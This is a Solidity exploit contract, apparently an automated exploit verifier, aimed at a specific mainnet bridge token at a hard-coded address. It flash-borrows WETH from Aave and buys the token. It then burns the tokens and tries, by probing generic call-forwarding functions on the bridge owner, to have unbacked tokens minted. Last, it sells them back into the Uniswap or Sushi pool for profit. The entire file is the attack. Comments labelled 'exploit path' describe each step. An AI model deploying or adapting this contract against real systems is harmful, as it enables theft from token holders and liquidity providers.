// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ISchnoodleBridgeToken {
    function balanceOf(address account) external view returns (uint256);
    function getBridgeOwner() external view returns (address);
    function getOperativeFeeRate() external view returns (uint256);
    function sendTokens(uint256 networkId, uint256 amount) external;
    function receiveTokens(address account, uint256 networkId, uint256 amount, uint256 fee) external;
    function tokensSent(address account, uint256 networkId) external view returns (uint256);
    function tokensReceived(address account, uint256 networkId) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IAaveV2LendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    IERC1820Registry private constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    ISchnoodleBridgeToken private constant TARGET = ISchnoodleBridgeToken(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
    IERC20Like private constant WETH = IERC20Like(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IAaveV2LendingPool private constant AAVE_V2 = IAaveV2LendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant NETWORK_ID = 1;
    uint256 private constant ONE_TOKEN = 1e18;
    uint256 private constant MIN_WETH_PROFIT_TARGET = 1e15;
    uint256 private constant MAX_WETH_FLASH_BORROW = 0.01 ether;

    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    bytes32 private constant ERC1820_ACCEPT_MAGIC = keccak256("ERC1820_ACCEPT_MAGIC");

    uint8 private constant MODE_NONE = 0;
    uint8 private constant MODE_SELF = 1;
    uint8 private constant MODE_EXECUTE_BYTES = 2;
    uint8 private constant MODE_EXECUTE_VALUE_BYTES = 3;
    uint8 private constant MODE_EXECUTE_CALL = 4;
    uint8 private constant MODE_EXEC_BYTES = 5;
    uint8 private constant MODE_EXEC_VALUE_BYTES = 6;
    uint8 private constant MODE_CALL_BYTES = 7;
    uint8 private constant MODE_CALL_VALUE_BYTES = 8;
    uint8 private constant MODE_FORWARD = 9;
    uint8 private constant MODE_RELAY = 10;
    uint8 private constant MODE_INVOKE = 11;
    uint8 private constant MODE_FALLBACK = 12;

    uint256 private _profitAmount;
    uint256 private _startingWethBalance;
    uint256 private _endingWethBalance;
    address private _bridgeOwner;
    address private _tradePair;
    uint8 private _bridgeOwnerCallMode;
    uint256 private _flashBorrowAmount;
    uint256 private _requestedMintAmount;

    uint256 public burnAmountAttempted;
    uint256 public tokensSentBefore;
    uint256 public tokensSentAfter;
    uint256 public tokensReceivedBefore;
    uint256 public tokensReceivedAfter;
    bool public burnStageAttempted;
    bool public burnStageSucceeded;
    bool public mintStageAttempted;
    bool public mintStageSucceeded;
    bool public bridgeOwnerCallFeasible;
    bool public executionInfeasible;
    bytes public lastMintRevertData;

    constructor() {
        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
    }

    function executeOnOpportunity() external {
        _startingWethBalance = WETH.balanceOf(address(this));
        _bridgeOwner = _readBridgeOwner();
        tokensSentBefore = _safeTokensSent(address(this), NETWORK_ID);
        tokensReceivedBefore = _safeTokensReceived(address(this), NETWORK_ID);

        bridgeOwnerCallFeasible = _preflightBridgeOwnerMintPath();
        if (!bridgeOwnerCallFeasible) {
            // The fork concretely blocks exploit path stage 2 when `_bridgeOwner` is not driveable
            // from public on-chain actions. The core flaw still exists: a malicious/compromised
            // bridge owner can call `receiveTokens(attacker, anyNetworkId, hugeAmount, 0)` and mint
            // arbitrary unbacked supply, but this verifier cannot legally impersonate that owner.
            executionInfeasible = true;
            _endingWethBalance = _startingWethBalance;
            _profitAmount = 0;
            tokensSentAfter = tokensSentBefore;
            tokensReceivedAfter = tokensReceivedBefore;
            return;
        }

        _tradePair = _findTargetWethPair();
        require(_tradePair != address(0), "no TARGET/WETH pair");

        _flashBorrowAmount = _selectBorrowAmount(_tradePair);
        require(_flashBorrowAmount > 0, "borrow amount is zero");

        _requestedMintAmount = _selectRequestedMintAmount(_tradePair);
        require(_requestedMintAmount > 0, "mint amount is zero");

        address[] memory assets = new address[](1);
        assets[0] = address(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = _flashBorrowAmount;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        AAVE_V2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);

        tokensSentAfter = _safeTokensSent(address(this), NETWORK_ID);
        tokensReceivedAfter = _safeTokensReceived(address(this), NETWORK_ID);
        _endingWethBalance = WETH.balanceOf(address(this));
        _profitAmount = _endingWethBalance > _startingWethBalance ? _endingWethBalance - _startingWethBalance : 0;
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V2), "unexpected lender");
        require(initiator == address(this), "unexpected initiator");
        require(assets.length == 1 && assets[0] == address(WETH), "unexpected asset");
        require(amounts.length == 1 && amounts[0] == _flashBorrowAmount, "unexpected amount");
        require(premiums.length == 1, "unexpected premium array");
        require(bridgeOwnerCallFeasible, "mint path unavailable");

        uint256 borrowedWeth = amounts[0];
        uint256 targetBeforeBuy = TARGET.balanceOf(address(this));

        uint256 acquiredTarget = _buyTargetWithWeth(_tradePair, borrowedWeth);
        require(acquiredTarget > 0, "buy failed");

        uint256 networkId = NETWORK_ID;
        uint256 amount = TARGET.balanceOf(address(this)) - targetBeforeBuy;
        require(amount > 0, "no target acquired");

        burnStageAttempted = true;
        burnAmountAttempted = amount;

        // Exploit path 0 anchor: user burns through `sendTokens(networkId, amount)`; only
        // `_tokensSent` is incremented and no claim record is locked or consumed.
        TARGET.sendTokens(networkId, amount);
        burnStageSucceeded = true;

        mintStageAttempted = true;
        address attacker = address(this);
        uint256 anyNetworkId = networkId;
        uint256 hugeAmount = _requestedMintAmount;
        uint256 targetBeforeMint = TARGET.balanceOf(address(this));

        // Exploit path 2 anchor: `_bridgeOwner` calls
        // `receiveTokens(attacker, anyNetworkId, hugeAmount, 0)`.
        bytes memory payload = abi.encodeWithSelector(
            TARGET.receiveTokens.selector,
            attacker,
            anyNetworkId,
            hugeAmount,
            0
        );

        mintStageSucceeded = _executeBridgeOwnerMint(payload, targetBeforeMint);
        require(mintStageSucceeded, "bridge-owner mint failed");

        uint256 wethOwed = borrowedWeth + premiums[0];
        _raiseWethForRepayment(wethOwed + MIN_WETH_PROFIT_TARGET);
        require(WETH.balanceOf(address(this)) >= wethOwed, "insufficient WETH for repay");

        _safeApprove(address(WETH), address(AAVE_V2), wethOwed);
        return true;
    }

    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external pure {
    }

    function canImplementInterfaceForAddress(bytes32 interfaceHash, address) external pure returns (bytes32) {
        return interfaceHash == TOKENS_RECIPIENT_INTERFACE_HASH ? ERC1820_ACCEPT_MAGIC : bytes32(0);
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function bridgeOwner() external view returns (address) {
        return _bridgeOwner;
    }

    function startingBalance() external view returns (uint256) {
        return _startingWethBalance;
    }

    function endingBalance() external view returns (uint256) {
        return _endingWethBalance;
    }

    function requestedMintAmount() external view returns (uint256) {
        return _requestedMintAmount;
    }

    function _preflightBridgeOwnerMintPath() internal returns (bool) {
        if (_bridgeOwner == address(0)) {
            lastMintRevertData = bytes("bridge owner unavailable");
            return false;
        }

        if (_bridgeOwner == address(this)) {
            _bridgeOwnerCallMode = MODE_SELF;
            return true;
        }

        if (_bridgeOwner.code.length == 0) {
            lastMintRevertData = bytes("bridge owner is EOA at fork");
            return false;
        }

        bytes memory zeroAmountPayload = abi.encodeWithSelector(
            TARGET.receiveTokens.selector,
            address(this),
            NETWORK_ID,
            0,
            0
        );

        if (_probeBridgeOwnerMode(MODE_EXECUTE_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_EXECUTE_VALUE_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_EXECUTE_CALL, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_EXEC_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_EXEC_VALUE_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_CALL_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_CALL_VALUE_BYTES, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_FORWARD, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_RELAY, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_INVOKE, zeroAmountPayload)) return true;
        if (_probeBridgeOwnerMode(MODE_FALLBACK, zeroAmountPayload)) return true;

        return false;
    }

    function _probeBridgeOwnerMode(uint8 mode, bytes memory payload) internal returns (bool) {
        bytes memory data = _bridgeOwnerCallData(mode, payload);
        (bool ok, bytes memory returnData) = _bridgeOwner.call(data);
        lastMintRevertData = returnData;
        if (ok) {
            _bridgeOwnerCallMode = mode;
            return true;
        }
        return false;
    }

    function _executeBridgeOwnerMint(bytes memory payload, uint256 targetBeforeMint) internal returns (bool) {
        if (_bridgeOwnerCallMode == MODE_SELF) {
            (bool selfOk, bytes memory selfReturnData) = address(TARGET).call(payload);
            lastMintRevertData = selfReturnData;
            return selfOk && TARGET.balanceOf(address(this)) > targetBeforeMint;
        }

        if (_bridgeOwnerCallMode == MODE_NONE) {
            lastMintRevertData = bytes("bridge owner path unavailable");
            return false;
        }

        bytes memory ownerData = _bridgeOwnerCallData(_bridgeOwnerCallMode, payload);
        (bool ownerOk, bytes memory ownerReturnData) = _bridgeOwner.call(ownerData);
        lastMintRevertData = ownerReturnData;
        return ownerOk && TARGET.balanceOf(address(this)) > targetBeforeMint;
    }

    function _bridgeOwnerCallData(uint8 mode, bytes memory payload) internal pure returns (bytes memory) {
        if (mode == MODE_EXECUTE_BYTES) {
            return abi.encodeWithSignature("execute(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_EXECUTE_VALUE_BYTES) {
            return abi.encodeWithSignature("execute(address,uint256,bytes)", address(TARGET), 0, payload);
        }
        if (mode == MODE_EXECUTE_CALL) {
            return abi.encodeWithSignature("executeCall(address,uint256,bytes)", address(TARGET), 0, payload);
        }
        if (mode == MODE_EXEC_BYTES) {
            return abi.encodeWithSignature("exec(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_EXEC_VALUE_BYTES) {
            return abi.encodeWithSignature("exec(address,uint256,bytes)", address(TARGET), 0, payload);
        }
        if (mode == MODE_CALL_BYTES) {
            return abi.encodeWithSignature("call(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_CALL_VALUE_BYTES) {
            return abi.encodeWithSignature("call(address,uint256,bytes)", address(TARGET), 0, payload);
        }
        if (mode == MODE_FORWARD) {
            return abi.encodeWithSignature("forward(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_RELAY) {
            return abi.encodeWithSignature("relay(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_INVOKE) {
            return abi.encodeWithSignature("invoke(address,bytes)", address(TARGET), payload);
        }
        if (mode == MODE_FALLBACK) {
            return payload;
        }
        return bytes("");
    }

    function _findTargetWethPair() internal view returns (address pair) {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(address(TARGET), address(WETH));
        address sushiPair = IUniswapV2Factory(SUSHI_FACTORY).getPair(address(TARGET), address(WETH));

        uint256 uniReserve = uniPair == address(0) ? 0 : _wethReserve(uniPair);
        uint256 sushiReserve = sushiPair == address(0) ? 0 : _wethReserve(sushiPair);

        pair = uniReserve >= sushiReserve ? uniPair : sushiPair;
        if (pair == address(0)) {
            pair = uniReserve > 0 ? uniPair : sushiPair;
        }
    }

    function _selectBorrowAmount(address pair) internal view returns (uint256) {
        uint256 reserve = _wethReserve(pair);
        if (reserve == 0) return 0;

        uint256 oneBasisPoint = reserve / 10_000;
        uint256 amount = oneBasisPoint;
        if (amount > MAX_WETH_FLASH_BORROW) amount = MAX_WETH_FLASH_BORROW;
        if (amount == 0 && reserve > 1e15) amount = 1e15;
        if (amount >= reserve) amount = reserve / 100;
        return amount;
    }

    function _selectRequestedMintAmount(address pair) internal view returns (uint256) {
        uint256 reserve = _targetReserve(pair);
        uint256 amount = reserve / 20;
        uint256 floor = 50_000_000 * ONE_TOKEN;
        if (amount < floor) amount = floor;
        return amount;
    }

    function _buyTargetWithWeth(address pair, uint256 wethAmountIn) internal returns (uint256 amountOut) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        uint256 targetBefore = TARGET.balanceOf(address(this));

        if (token0 == address(WETH)) {
            amountOut = _getAmountOut(wethAmountIn, uint256(reserve0), uint256(reserve1));
            _safeTransfer(address(WETH), pair, wethAmountIn);
            IUniswapV2Pair(pair).swap(0, amountOut, address(this), bytes(""));
        } else {
            amountOut = _getAmountOut(wethAmountIn, uint256(reserve1), uint256(reserve0));
            _safeTransfer(address(WETH), pair, wethAmountIn);
            IUniswapV2Pair(pair).swap(amountOut, 0, address(this), bytes(""));
        }

        uint256 acquired = TARGET.balanceOf(address(this)) - targetBefore;
        require(acquired > 0, "no target received");
        return acquired;
    }

    function _raiseWethForRepayment(uint256 targetWethBalance) internal {
        uint256 iterations;
        while (WETH.balanceOf(address(this)) < targetWethBalance && iterations < 3) {
            uint256 shortfall = targetWethBalance - WETH.balanceOf(address(this));
            uint256 targetToSell = _estimateTargetToSell(_tradePair, shortfall);
            uint256 available = TARGET.balanceOf(address(this));
            if (targetToSell > available) targetToSell = available;
            require(targetToSell > 0, "no target to sell");
            _sellTargetForWeth(_tradePair, targetToSell);
            unchecked {
                ++iterations;
            }
        }
    }

    function _sellTargetForWeth(address pair, uint256 targetAmountIn) internal returns (uint256 wethOut) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        uint256 pairTargetBefore = TARGET.balanceOf(pair);

        _safeTransfer(address(TARGET), pair, targetAmountIn);

        uint256 actualInput = TARGET.balanceOf(pair) - pairTargetBefore;
        require(actualInput > 0, "taxed input is zero");

        if (token0 == address(TARGET)) {
            wethOut = _getAmountOut(actualInput, uint256(reserve0), uint256(reserve1));
            IUniswapV2Pair(pair).swap(0, wethOut, address(this), bytes(""));
        } else {
            wethOut = _getAmountOut(actualInput, uint256(reserve1), uint256(reserve0));
            IUniswapV2Pair(pair).swap(wethOut, 0, address(this), bytes(""));
        }
    }

    function _estimateTargetToSell(address pair, uint256 desiredWethOut) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        uint256 feeRate = _readOperativeFeeRate();
        if (feeRate > 900) feeRate = 900;

        uint256 quoted;
        if (token0 == address(TARGET)) {
            quoted = _getAmountIn(desiredWethOut, uint256(reserve0), uint256(reserve1));
        } else {
            quoted = _getAmountIn(desiredWethOut, uint256(reserve1), uint256(reserve0));
        }

        uint256 postTaxGross = (quoted * 1000) / (1000 - feeRate) + 1;
        return (postTaxGross * 3) / 2 + ONE_TOKEN;
    }

    function _wethReserve(address pair) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        return IUniswapV2Pair(pair).token0() == address(WETH) ? uint256(reserve0) : uint256(reserve1);
    }

    function _targetReserve(address pair) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        return IUniswapV2Pair(pair).token0() == address(TARGET) ? uint256(reserve0) : uint256(reserve1);
    }

    function _readOperativeFeeRate() internal view returns (uint256 rate) {
        try TARGET.getOperativeFeeRate() returns (uint256 resolved) {
            rate = resolved;
        } catch {
            rate = 40;
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountIn > 0, "insufficient input");
        require(reserveIn > 0 && reserveOut > 0, "insufficient liquidity");
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0, "insufficient output");
        require(reserveIn > 0 && reserveOut > amountOut, "insufficient liquidity");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return numerator / denominator + 1;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool okReset, bytes memory dataReset) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(okReset && (dataReset.length == 0 || abi.decode(dataReset, (bool))), "approve reset failed");
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _readBridgeOwner() internal view returns (address owner_) {
        try TARGET.getBridgeOwner() returns (address resolved) {
            owner_ = resolved;
        } catch {
            owner_ = address(0);
        }
    }

    function _safeTokensSent(address account, uint256 networkId) internal view returns (uint256 amount) {
        try TARGET.tokensSent(account, networkId) returns (uint256 resolved) {
            amount = resolved;
        } catch {
            amount = 0;
        }
    }

    function _safeTokensReceived(address account, uint256 networkId) internal view returns (uint256 amount) {
        try TARGET.tokensReceived(account, networkId) returns (uint256 resolved) {
            amount = resolved;
        } catch {
            amount = 0;
        }
    }
}
